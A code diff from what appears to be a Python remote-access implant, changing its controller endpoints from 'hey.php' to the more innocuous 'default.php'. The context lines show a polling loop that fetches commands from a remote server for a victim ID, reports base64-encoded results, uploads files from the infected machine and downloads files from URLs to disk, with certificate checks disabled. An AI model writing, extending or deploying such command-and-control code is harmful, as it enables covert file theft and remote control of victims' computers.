@@ -16,11 +16,11 @@ message_bytes = message.encode('ascii')
 base64_bytes = base64.b64encode(message_bytes)
 base64_message = base64_bytes.decode('ascii')
 
-hello = requests.get(url + "/hey.php?m=res&res=" + base64_message + "&id="+uid, verify=False)
+hello = requests.get(url + "/default.php?m=res&res=" + base64_message + "&id="+uid, verify=False)
 
 while True:
 	try:
-		cmds = requests.get(url + "/hey.php?m=cmds&id="+uid+"&o=P", verify=False)
+		cmds = requests.get(url + "/default.php?m=cmds&id="+uid+"&o=P", verify=False)
 		cmds = str(cmds.text)
 		for lines in cmds.splitlines():
 			if str(uid) in lines:
@@ -45,8 +45,8 @@ while True:
 					multipart_form_data = {
    					'data': (str(filenamedl).strip(), open(filedl, 'rb')),
 					}
-					tellme = requests.get(url + "/hey.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
-					gimme = requests.post(url + "/hey.php?m=up&id="+uid, files=multipart_form_data , verify=False)
+					tellme = requests.get(url + "/default.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
+					gimme = requests.post(url + "/default.php?m=up&id="+uid, files=multipart_form_data , verify=False)
 				
 				
 				if act == "upload":
@@ -58,7 +58,7 @@ while True:
 					messagedl_bytes = messagedl.encode('ascii')
 					base64_bytes = base64.b64encode(messagedl_bytes)
 					base64_messagedl = base64_bytes.decode('ascii')
-					tellme = requests.get(url + "/hey.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
+					tellme = requests.get(url + "/default.php?m=res&res=" + base64_messagedl + "&id="+uid, verify=False)
 					takethis = requests.get(urldl, verify=False)
 					with open(path, 'wb') as f:
     						f.write(takethis.content)
